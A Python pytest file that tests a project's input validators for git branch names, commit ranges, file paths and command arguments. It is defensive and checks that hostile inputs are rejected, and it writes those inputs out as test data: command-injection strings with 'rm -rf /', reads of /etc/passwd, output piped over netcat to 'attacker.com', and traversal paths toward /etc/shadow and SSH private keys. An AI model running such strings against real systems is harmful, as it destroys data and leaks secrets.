"""
Security tests for input validation and sanitization.

These tests verify that security vulnerabilities identified in the code review
are properly addressed through input validation.
"""

import pytest

from lucidity.validation import (
    is_valid_branch_name,
    is_valid_commit_range,
    is_valid_path,
    sanitize_git_command_args,
)


class TestBranchNameValidation:
    """Tests for branch name validation to prevent directory traversal."""

    def test_valid_branch_names(self):
        """Test that valid branch names are accepted."""
        assert is_valid_branch_name("main")
        assert is_valid_branch_name("develop")
        assert is_valid_branch_name("feature/my-feature")
        assert is_valid_branch_name("bugfix/issue-123")
        assert is_valid_branch_name("release/1.0.0")
        assert is_valid_branch_name("feature_test")
        assert is_valid_branch_name("my-branch-123")

    def test_directory_traversal_attempts(self):
        """Test that branch names with directory traversal are rejected."""
        assert not is_valid_branch_name("../../etc/passwd")
        assert not is_valid_branch_name("../../../root")
        assert not is_valid_branch_name("feature/../../../etc")
        assert not is_valid_branch_name("test/../../passwd")

    def test_branch_names_starting_with_dots(self):
        """Test that branch names starting with dots are rejected."""
        assert not is_valid_branch_name(".hidden")
        assert not is_valid_branch_name("..secret")
        assert not is_valid_branch_name("..")

    def test_branch_names_starting_with_dashes(self):
        """Test that branch names starting with dashes (options) are rejected."""
        assert not is_valid_branch_name("--help")
        assert not is_valid_branch_name("-option")
        assert not is_valid_branch_name("--version")

    def test_empty_or_invalid_branch_names(self):
        """Test that empty or invalid branch names are rejected."""
        assert not is_valid_branch_name("")
        assert not is_valid_branch_name(None)  # type: ignore
        assert not is_valid_branch_name("branch with spaces")
        assert not is_valid_branch_name("branch@special")
        assert not is_valid_branch_name("branch$dollar")


class TestCommitRangeValidation:
    """Tests for commit range validation to prevent command injection."""

    def test_valid_commit_ranges(self):
        """Test that valid commit ranges are accepted."""
        assert is_valid_commit_range("HEAD~1..HEAD")
        assert is_valid_commit_range("HEAD~5..HEAD")
        assert is_valid_commit_range("abc123..def456")
        assert is_valid_commit_range("main..feature-branch")
        assert is_valid_commit_range("v1.0.0..v2.0.0")
        assert is_valid_commit_range("HEAD^..HEAD")
        assert is_valid_commit_range("origin/main..HEAD")

    def test_command_injection_attempts(self):
        """Test that commit ranges with shell metacharacters are rejected."""
        assert not is_valid_commit_range("HEAD; rm -rf /")
        assert not is_valid_commit_range("HEAD && cat /etc/passwd")
        assert not is_valid_commit_range("HEAD | nc attacker.com 1234")
        assert not is_valid_commit_range("HEAD & background-command")
        assert not is_valid_commit_range("HEAD`malicious-command`")
        assert not is_valid_commit_range("HEAD$malicious")
        assert not is_valid_commit_range("HEAD\nmalicious")

    def test_commit_ranges_starting_with_dashes(self):
        """Test that commit ranges starting with dashes (options) are rejected."""
        assert not is_valid_commit_range("--help")
        assert not is_valid_commit_range("-a")
        assert not is_valid_commit_range("--version")

    def test_empty_or_invalid_commit_ranges(self):
        """Test that empty or invalid commit ranges are rejected."""
        assert not is_valid_commit_range("")
        assert not is_valid_commit_range(None)  # type: ignore
        # Valid format but with special characters should still fail
        assert not is_valid_commit_range("HEAD..HEAD; malicious")


class TestPathValidation:
    """Tests for path validation to prevent directory traversal and injection."""

    def test_valid_paths(self):
        """Test that valid file paths are accepted."""
        assert is_valid_path("src/main.py")
        assert is_valid_path("lib/utils.js")
        assert is_valid_path("docs/README.md")
        assert is_valid_path("path/to/file.txt")
        assert is_valid_path("file.txt")
        assert is_valid_path("src/nested/deeply/file.py")

    def test_directory_traversal_attempts(self):
        """Test that paths with directory traversal are rejected."""
        assert not is_valid_path("../../etc/passwd")
        assert not is_valid_path("../../../root/.ssh/id_rsa")
        assert not is_valid_path("src/../../../etc/shadow")
        assert not is_valid_path("legitimate/../../../etc/passwd")
        # Windows-style paths
        assert not is_valid_path("..\\..\\windows\\system32")

    def test_paths_starting_with_dashes(self):
        """Test that paths starting with dashes (options) are rejected."""
        assert not is_valid_path("--help")
        assert not is_valid_path("-a")
        assert not is_valid_path("--version")

    def test_paths_with_shell_metacharacters(self):
        """Test that paths with shell metacharacters are rejected."""
        assert not is_valid_path("file.txt; rm -rf /")
        assert not is_valid_path("file.txt && malicious")
        assert not is_valid_path("file.txt | nc attacker.com")
        assert not is_valid_path("file.txt`malicious`")
        assert not is_valid_path("file.txt$var")

    def test_empty_or_invalid_paths(self):
        """Test that empty or invalid paths are rejected."""
        assert not is_valid_path("")
        assert not is_valid_path(None)  # type: ignore


class TestGitCommandSanitization:
    """Tests for git command argument sanitization."""

    def test_safe_arguments(self):
        """Test that safe arguments pass through unchanged."""
        args = ["diff", "HEAD~1..HEAD", "src/main.py"]
        result = sanitize_git_command_args(args)
        assert result == args

    def test_shell_metacharacters_rejected(self):
        """Test that arguments with shell metacharacters are rejected."""
        with pytest.raises(ValueError, match="shell metacharacters"):
            sanitize_git_command_args(["diff", "HEAD; rm -rf /"])

        with pytest.raises(ValueError, match="shell metacharacters"):
            sanitize_git_command_args(["diff", "HEAD && malicious"])

        with pytest.raises(ValueError, match="shell metacharacters"):
            sanitize_git_command_args(["diff", "HEAD | nc"])

        with pytest.raises(ValueError, match="shell metacharacters"):
            sanitize_git_command_args(["diff", "HEAD`malicious`"])

    def test_non_string_arguments_rejected(self):
        """Test that non-string arguments are rejected."""
        with pytest.raises(ValueError, match="must be string"):
            sanitize_git_command_args(["diff", 123])  # type: ignore

        with pytest.raises(ValueError, match="must be string"):
            sanitize_git_command_args(["diff", None])  # type: ignore


class TestInputValidationIntegration:
    """Integration tests for input validation in the context of git operations."""

    def test_malicious_branch_in_url_format(self):
        """Test that malicious branch names in URL format are rejected."""
        # These should be rejected when parsed as branch names
        malicious_branches = [
            "../../etc/passwd",
            "--help",
            "; rm -rf /",
            "branch; malicious",
        ]

        for branch in malicious_branches:
            assert not is_valid_branch_name(branch), f"Branch '{branch}' should be rejected"

    def test_safe_workflow_inputs(self):
        """Test that legitimate workflow inputs are accepted."""
        # Common legitimate use cases
        assert is_valid_branch_name("main")
        assert is_valid_branch_name("feature/add-tests")
        assert is_valid_commit_range("HEAD~1..HEAD")
        assert is_valid_commit_range("main..develop")
        assert is_valid_path("src/tools/git_utils.py")
        assert is_valid_path("tests/test_security.py")

    def test_edge_cases(self):
        """Test edge cases in validation."""
        # Branch names with underscores and numbers
        assert is_valid_branch_name("feature_123")
        assert is_valid_branch_name("release-v1.0")

        # Commit ranges with special git syntax
        assert is_valid_commit_range("HEAD^..HEAD")
        assert is_valid_commit_range("HEAD~3..HEAD~1")

        # Paths with dots (but not ..)
        assert is_valid_path("src/file.test.py")
        assert is_valid_path("docs/README.v2.md")
